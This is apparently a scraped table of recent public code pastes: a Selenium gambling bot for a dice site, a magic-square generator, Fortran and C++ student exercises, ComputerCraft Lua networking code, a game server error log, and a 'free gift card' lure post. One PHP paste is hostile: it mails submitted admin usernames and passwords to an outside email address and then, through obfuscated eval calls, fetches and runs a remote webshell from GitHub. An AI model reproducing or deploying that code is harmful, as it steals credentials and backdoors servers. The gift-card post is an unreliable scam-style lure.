id,title,username,language,date,content
q57aHUXy,snowybot.py,coinwalk,JavaScript,Sunday 12th of May 2024 08:57:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""iamsnow"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = 0.00000001
fart = 1
base = 0.00000001
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.1)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
qrUmnuv1,magic_square_sums,Python253,Python,Sunday 12th of May 2024 08:47:08 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: magic_square_sums.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script efficiently generates magic squares and computes the sum of each row, column, and diagonal for specified dimension ranges. Key points include:

    Magic Square Generation:
        - The script uses the Siamese method to generate magic squares of various dimensions.

    Sum Calculation:
        - It calculates the sum of each row, column, and diagonal within the generated magic squares.

    User Interface:
        - The script provides a user-friendly menu interface for selecting predefined dimension ranges.

    Terminal Output:
        - It displays the sums of rows, columns, and diagonals to the terminal for the selected dimension range.

    File Saving Option:
        - Additionally, users have the option to save the output data to a file. The filename is dynamically generated based on the selected dimension range.

Requirements:
    - Python3.x

Functions:
    1. magic_square(n): This function generates a magic square of dimension 'n x n' using the Siamese method.
    It calculates the sum of each row, column, and diagonal within the square and returns a formatted string indicating the dimensions & sums of the magic squares in range.

Usage:
    - Run the script in a Python environment.
    - Follow the on-screen prompts to select an option from the menu and input the desired dimension range.
    - The script will then generate magic squares for all odd dimensions within the specified range and display the sums of each row/column/diagonal to the terminal.
    - Optionally, the user can choose to save the output data to a file in the current working directory.

Additional Notes:
    - The script supports predefined dimension ranges ranging from 3x3 to 999x999.
    - Magic squares for dimensions less than 3 or even dimensions are not supported.
    - The sum of each row/column/diagonal is calculated and displayed for each generated magic square.
    - Output data can be saved to a file with a dynamically generated filename based on the selected dimension range.
""""""

import os

# Function to create Magic Square
def magic_square(n):
    if n < 3:
        return ""- Magic squares for dimensions less than 3 are not supported by this algorithm!\n""
    elif n % 2 == 0:
        return ""- Even dimension values are not supported by this algorithm!\n""

    # Initialize the magic square with zeros
    magicSquare = []
    for i in range(n):
        listt = []
        for j in range(n):
            listt.append(0)
        magicSquare.append(listt)

    # Initialize starting position
    i = n // 2
    j = n - 1

    # Set the number of elements to insert
    num = n * n
    count = 1

    # Populate the magic square
    while count <= num:
        if i == -1 and j == n:  # condition 4
            j = n - 2
            i = 0
        else:
            if j == n:  # column value is exceeding
                j = 0

            if i < 0:  # row  is becoming -1
                i = n - 1

        # Check if cell is occupied
        if magicSquare[i][j] != 0:
            j = j - 2
            i = i + 1
            continue

        else:
            magicSquare[i][j] = count
            count += 1

        # Move to the next cell
        i = i - 1
        j = j + 1  # condition 1

    # Calculate the sum of each row, column, and diagonal
    row_sums = [sum(row) for row in magicSquare]
    col_sums = [sum(col) for col in zip(*magicSquare)]
    diagonal_sum_1 = sum(magicSquare[i][i] for i in range(n))
    diagonal_sum_2 = sum(magicSquare[i][n - i - 1] for i in range(n))

    return f""The magic square {n}x{n} sum of each row/column/diagonal is: {sum(row_sums)}\n""

if __name__ == ""__main__"":
    """"""
    Main function to execute the script.
    """"""
    print(""   :: MAGIC SQUARES GENERATOR ::\n"")
    print(""\t:: Options Menu :"")
    print(""    ___________________________\n"")
    print(""    Option 1:     3x3 - 9x9"")
    print(""    Option 2:   11x11 - 31x31"")
    print(""    Option 3:   33x33 - 99x99"")
    print(""    Option 4: 101x101 - 315x315"")
    print(""    Option 5: 317x317 - 999x999"")  # This Option Will Take Some Time
    print(""    Option 6: !SHOW ALL RANGES!"")  # This Option Will Take Alot Of Time
    print(""    ___________________________"")

    option = int(input(""\n    Enter the option number: ""))
    output_data = """"
    start_range = 0
    end_range = 0

    if option == 1:
        start_range = 3
        end_range = 9
    elif option == 2:
        start_range = 11
        end_range = 31
    elif option == 3:
        start_range = 33
        end_range = 99
    elif option == 4:
        start_range = 101
        end_range = 315
    elif option == 5:
        print(
            ""\n\tThis Option Will Take Some Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 317
        end_range = 999
    elif option == 6:
        print(
            ""\n\tThis Option Will Take Alot Of Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 3
        end_range = 999
    else:
        print(""\nInvalid option selected!\n"")

    for n in range(start_range, end_range + 1, 2):
        output_data += magic_square(n)

    print(output_data)

    # Save the output sums of the given ranges to a dynamically named file in the curent working directory
    save_file = input(
        ""\nDo you want to save the output to a file?\n\n1: Yes\n2: No\n\nMake your selection (1 or 2): ""
    )
    if save_file == ""1"":
        file_name = (
            f""magic_square_{start_range}x{start_range}_to_{end_range}x{end_range}.txt""
        )
        with open(file_name, ""w"") as file:
            file.write(output_data)
        print(f""Output saved to {file_name} in the current directory!\n"")
    elif save_file == ""2"":
        print(""\nOutput not saved!\n"")
    else:
        print(""\nInvalid input. Output not saved!\n"")

"
ELEre1a5,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Sunday 12th of May 2024 08:41:27 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
13 May 2024"
7Ss62UmS,Backrooms Code Requester,iNxmi,Lua,Sunday 12th of May 2024 08:35:14 PM CDT,"local socket = require ""socket""
 
function getCode(id, location)
	local id, protocol, table = socket.request(id, nil, {location = location})
    return table[""code""]
end

return {
	getCode = getCode
}"
m3itbF8w,Backrooms Code Server,iNxmi,Lua,Sunday 12th of May 2024 08:31:56 PM CDT,"local socket = require ""socket""
 
function generateCode()
    local request = http.get(
        ""https://www.random.org/integers/?num=4&min=0&max=9&col=1&base=10&format=plain&rnd=new""
    )
 
    local text = request.readAll()
 
    return string.gsub(text, ""\n"", """")
end
 
local codes = {
    pool_door = generateCode()
}
print(textutils.serializeJSON(codes))
 
function response(id, protocol, table)
    local location = table[""location""]
    return codes[location]
end
 
while true do 
    print(""Listening on port "" .. os.computerID())
    
    local id, protocol, table = socket.receive()
    print(string.format(""id=%s protocol=%s table=%s"", id, protocol, table))
    local response = response(id, protocol, table)
    
    local data = {success = false, error = ""bad request""}
    if response ~= nil then
        data = {success = true, code = response}
    end
    
    print(data)
    socket.send(id, ""code"", data)
end
 
print(""Server stopped"")"
90aKF1YC,Degree_row_module,Oppaceted,Fortran,Sunday 12th of May 2024 08:27:45 PM CDT,"module Degree_row_module
    contains
    !
    subroutine output(string,x,n,y,d)
        integer :: string,i
        integer :: n(string)
        real(8) :: x(string),y(string),d(string)
        character(len = 72) :: cap = '+----+----------+------+----------+---------------+'
        write (*,'(a)') cap
        write (*,'(a)') '|  i |    x{i}  | n{i} |   y{i}   |      d{i}     |'
        do i = 1,string
            write (*,'(a)') cap
            write (*,'(a, i3, a, f10.6, a, i6, a, f10.6, a, es15.6, a)') '|', i, ' |', x(i), '|', n(i), '|', y(i),'|',d(i),'|'
        end do
        write (*,'(a)') cap
    end subroutine
    !
    subroutine ryad(str, x, n, y, d, E)
        integer :: str
        real(8) :: x(str), y(str), d(str)
        integer :: n(str)
        integer :: i
        real(8) :: E, ui
        do i =1, str
            n(i) = 0
            y(i) = log(2.0d0)
            ui = -1.0d0
            do while ( (abs(ui) >= (E * abs( y(i) ) ) ) .and. (n(i)<2500) )
                n(i) = n(i) + 1
                ui = -ui*x(i)*(0.5d0)
                y(i) = y(i) + ui/n(i)
            end do
            d(i) = abs( y(i)-log(x(i) + 2.0) )
        end do
    end subroutine
end module
"
1WkQuUHR,main,Oppaceted,Fortran,Sunday 12th of May 2024 08:26:55 PM CDT,"!
program main
    use Degree_row_module
    implicit none
    integer :: str, i
    integer, allocatable :: n(:)
    real(8), allocatable :: x(:), y(:), d(:)
    real(8) :: low, high
    real(8), parameter :: E = 1.0e-15
    !
    write (*,'(a$)') 'Enter number of strings: '
    read (*,*) str
    write (*,'(a$)') 'Enter low and high: '
    read (*,*) low, high
    !
    allocate(n(str))
    allocate(x(str))
    allocate(y(str))
    allocate(d(str))
    !
    n(:) = 0
    d(:) = 0.0d0
    y(:) = 0.0d0
    do i =1,str
        x(i) = low + ( ( (high-low)/(str-1) )*(i-1) )
    end do
    call ryad(str,x,n,y,d,E)
    call output(str,x,n,y,d)
    deallocate(n)
    deallocate(x)
    deallocate(y)
    deallocate(d)
end program main
"
yjHTQq7d,ejer2bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:10:21 PM CDT,"#include <iostream>
#include <clocale>
using namespace std;

/* Hacer un programa donde se carguen 15 números enteros y luego le solicite al usuario un número e indique si el mismo pertenece a la lista cargada anteriormente.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    int num;
    bool num_encontrado = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un número: "";
        cin >> vec_num[i];
    }
    cout<<endl<<endl;
    cout <<""Ingrese un número para verificar si se encuentra en el listado proporcionado: ""<<endl;
    cin >>num;
    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]== num){
            cout<< vec_num[j]<<"" de la posición ""<< j+1 <<"" coincide con un número de la lista""<<endl;
            //cout<<"","";
            num_encontrado= true;
        }
    }
    if (!num_encontrado){
    cout<<""No hay coincidencias"";
    }


    return 0;
    }"
MVmKSu2J,ejer1bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:09:40 PM CDT,"#include <iostream>
using namespace std;
#include <clocale>

/*Hacer un programa que le pida al usuario una lista de 10 números enteros y luego de ingresarlos muestre cuáles de ellos fueron positivos.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    bool num_pos = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un número""<<endl;
        cin >> vec_num[i];
    }

    cout<< ""Los números positivos son: ""<<endl;

    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]>0){
            if(num_pos = true){
            //cout<< ""Los números positivos son: "" << endl << vec_num[j]<< ""de la posición ""<< vec_num[j]+1<< endl;
            cout<< vec_num[j]<<"" de la posición ""<< j+1 <<endl;
            //cout<<"","";
            num_pos= true;
            }

       }
    }
    if (!num_pos){
    cout<<""No hay positivos"";
    }
    return 0;
    }"
NibJ3Jwk,php,blackhat1337,PHP,Sunday 12th of May 2024 08:06:36 PM CDT,"<?php

$subjek = 'RESUL';
$mailto = 'muhrazky@gmail.com'; //masukin email lo disini

//////////////////////////////////////

$user = $_POST['log'];
$pass = $_POST['pwd'];

//////////////////////////////////////

$body = <<<EOD
<br><hr><br>
<center><font size=""4"" ;"" color=""red"">RESULT LOG ADMIN!<br></font>
<font size=""2"" color=""red"">Username\Email :</font><font size""2"" color=""black"">$user</font><br>
<font size=""2"" color=""red"">Password : </font><font size""2"" color=""black"">$pass</font> <br></center>
EOD;

$headers = ""From: muhrazky@gmail.com\r\n"";
$headers .= ""Content-type: text/html\r\n"";
$success = mail($mailto, $subjek, $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<?php eval(""?>"".file_get_contents(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>""));?>

<?=/****/@null; /********/ /*******/ /********/@eval/****/(""?>"".file_get_contents/*******/(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>"
stP1tZPW,Untitled,rosander,Lua,Sunday 12th of May 2024 07:42:56 PM CDT,"2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:341: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:03:01.779 INFO    dcs_grpc::stats: Calls per second: average=64.34, highest=66.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Events per second: average=14.36, highest=1.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Blocking time: total=2.322ms (≙ 0.00%)
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:01.223 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Calls per second: average=64.28, highest=65.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Blocking time: total=2.2783ms (≙ 0.00%)
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:32.490 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:37.836 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:43.368 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:52.228 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Calls per second: average=64.31, highest=65.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Blocking time: total=2.3493ms (≙ 0.00%)
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to inde"
